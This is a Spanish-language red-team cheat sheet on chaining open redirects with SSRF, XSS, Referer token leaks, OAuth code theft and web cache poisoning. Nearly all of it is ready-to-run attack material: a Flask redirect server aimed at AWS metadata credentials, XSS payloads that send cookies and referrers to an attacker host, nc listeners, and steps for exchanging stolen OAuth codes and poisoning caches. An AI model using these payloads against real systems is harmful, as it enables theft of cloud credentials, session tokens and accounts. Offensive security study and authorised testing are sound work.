---
aliases:
  - Open Redirect Chain
  - SSRF via Redirect
  - XSS via Redirect
tags:
  - vuln/open-redirect
  - technique/lateral-movement
  - technique/credential-access
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Open Redirect]]"
  - "[[Server-Side Request Forgery (SSRF)]]"
  - "[[Cross-Site Scripting (XSS)]]"
  - "[[Web Cache Poisoning]]"
  - "[[OAuth 2.0 - Code y Token Theft]]"
---
# Open Redirect - Chains con Otras Vulns

---

## SSRF via Redirect Chain

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Hostear redirect: `python3 -m http.server 80` con script CGI que retorna `Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/` | AWS metadata via redirect | Server SSRF que sigue redirects. |
| `curl https://target.com/api/image-proxy?url=https://attacker.com/r` | Trigger fetch que sigue redirect → AWS creds | Image proxy sin redirect deny. |
| Hostear redirect a `http://127.0.0.1:6379/info` | Redis interno via redirect | Server con SSRF whitelist external-only. |
| Hostear redirect 308 (preserva method) `https://attacker.com/r → 308 → http://internal/admin` | POST → POST a internal | Method-preserving redirect chain. |
| Hostear redirect 302 (strip body) `https://attacker.com/r → 302 → http://internal/api` | GET a internal post-redirect | Standard 302. |
| `curl https://target.com/api/url-preview?url=https://attacker.com/r` | URL preview / OG card → fetches metadata | Open Graph fetcher. |
| `curl -X POST https://target.com/api/webhook -d '{"url":"https://attacker.com/r"}'` | Webhook delivery follows redirect | Webhook callback abuse. |
| Setup DNS rebinding con `rebinder.io`: `7f000001.attacker.com` resuelve a `127.0.0.1` second resolve | Bypass IP whitelist via DNS race | DNS rebinding. |
^or-chain-ssrf

### SSRF chain workflow

```bash
# 1. Atacante hostea redirect server (Flask)
cat <<'EOF' > redir.py
from flask import Flask, redirect
app = Flask(__name__)
@app.route('/r')
def r():
    return redirect('http://169.254.169.254/latest/meta-data/iam/security-credentials/', code=302)
app.run(host='0.0.0.0', port=80)
EOF
python3 redir.py

# 2. Trigger SSRF en target
curl "https://target.com/api/image-proxy?url=https://attacker.com/r"

# 3. Target fetches attacker.com → follows redirect → fetches AWS metadata
# Response contains AWS credentials → theft.
```

---

## XSS via `javascript:` / `data:` URL

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target/redir?next=javascript:alert(document.cookie)"` | XSS direct via JS scheme | App pasa value a `Location:` directo. |
| `<a href="https://target/redir?next=javascript:alert(1)">Click</a>` | Reflected as `<a href>` | Browser ejecuta on click. |
| `curl -sI "https://target/redir?next=data:text/html,<script>fetch('//attacker?'+document.cookie)</script>"` | XSS via data URL | data: scheme aceptado. |
| `curl -sI "https://target/redir?next=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="` | Base64 data URL | Filter naive sobre `<script>`. |
| Inspect callback page: `curl -s https://target/cb?next=javascript:alert(1) \| grep -oE 'href="[^"]+"\|location\.[a-z]+\s*=\s*[^;]+'` | Identificar sink | Source review pre-attack. |
| `curl -sI "https://target/redir?next=jAvAsCrIpT:alert(1)"` | Mixed-case scheme bypass | Filter case-sensitive. |
| `curl -sI "https://target/redir?next=java%09script:alert(1)"` | Tab control char bypass | Strip control before validation. |
^or-chain-xss

---

## Token Leak via Referer

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nc -lvnp 80` en attacker → recibir GET con Referer header del browser víctima | Captura URL con token via Referer | Víctima clickea link post-page con token en URL. |
| `curl -sI https://target/reset?token=$T \| grep -i referrer-policy` | Verificar Referrer-Policy | Defense check. |
| Crear página `attacker.com/welcome.html` con `<img src="//attacker/log">` → server logs Referer | Auto-leak Referer en GET | Pasive collection. |
| Atacante phishing email con link: `https://target/redir?next=https://attacker.com/welcome.html` | Trigger redirect chain → Referer leak | Combine con OR. |
| `<script>fetch('//attacker?ref='+document.referrer)</script>` (XSS combo) | JS-side referrer exfil | XSS chain. |
| Inspect server access logs: `tail -f /var/log/nginx/access.log \| grep -i 'token='` | Verificar logs server captura URL con tokens | Forensic post-attack. |
^or-chain-referer

### Workflow token leak via Referer

```bash
# 1. Víctima recibe link reset password
# https://target.com/reset?token=ABC123

# 2. Atacante hostea attacker.com/welcome.html con img to attacker
# Atacante envía link secundario al víctima:
# https://target.com/redirect?next=https://attacker.com/welcome.html

# 3. Víctima abre reset page → clickea otro link → redirect a attacker
# 4. Browser envía: Referer: https://target.com/reset?token=ABC123
# 5. Atacante lee server logs:
tail -f /var/log/nginx/access.log | grep -oE 'token=[A-Za-z0-9]+'
```

---

## OAuth Code Stealing

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `https://idp.target.com/oauth/authorize?client_id=APP&response_type=code&redirect_uri=https://attacker.com/cb&state=X` | Code grant interceptado por atacante | redirect_uri sin validar estricto. |
| `?response_type=token&redirect_uri=https://attacker.com#access_token=...` | Implicit flow → access_token directo | response_type=token habilitado. |
| `?redirect_uri=https://taken-subdomain.target.com/cb` | Subdomain takeover combo | Wildcard `*.target.com` + dangling. |
| `?redirect_uri=https://target.com/oauth/cb/../redirect?url=https://attacker.com` | Path traversal + chain con OR interno | startsWith con path. |
| `nc -lvnp 80` en attacker.com → recibir `?code=...` en query | Capture code | Listener post-redirect. |
| `curl -X POST https://idp.target.com/oauth/token -d "code=$STOLEN&client_id=APP&client_secret=$LEAK&redirect_uri=https://attacker.com/cb"` | Exchange code por access_token | Public client o secret leaked. |
| `curl -H "Authorization: Bearer $TOKEN" https://api.target.com/me` | Acceso API como víctima | Post-token. |
^or-chain-oauth

---

## Cache Poisoning Combo

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "X-Forwarded-Host: attacker.com" https://target/login` | Cache server stores Location: attacker.com | Header reflejado en redirect + unkeyed. |
| `curl -H "X-Forwarded-Host: attacker.com" https://target/api/oauth/cb?code=X` | Cache de OAuth callback con redirect malicious | Mass code theft. |
| `curl -H "X-Forwarded-Host: attacker.com" https://target/?cb=$(date +%s)` (force unique cache key) | Cache pollution probe | Cache key analysis pre-attack. |
| Param Miner Burp → "Guess headers" en endpoint con redirect | Detecta unkeyed headers | Discovery automation. |
| `curl -X POST -H "Host: attacker.com" https://target/login` (Host override) | Host header redirect cache poison | Host reflejado. |
| Post-poison: `curl https://target/login` (víctima común) → recibe Location: attacker.com | Mass impact verification | TTL del cache. |
^or-chain-cache

---
